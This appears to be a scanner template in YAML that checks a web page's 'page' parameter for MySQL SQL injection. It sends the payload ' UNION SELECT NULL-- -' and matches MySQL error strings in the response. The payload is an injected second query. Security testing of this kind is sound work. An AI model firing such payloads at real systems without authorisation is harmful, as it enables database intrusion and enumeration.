id: patt-sqli-mysql-union-01-page
name: 'PATT sqli patt-sqli-mysql-union-01 via page'
severity: high
type: active
tags:
  - sqli
  - patt
requires:
  - php
description: 'PATT MySQL UNION 1 kolom (raise stepwise for enumeration). [patt:patt-sqli-mysql-union-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - ''' UNION SELECT NULL-- -'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'Unknown column'
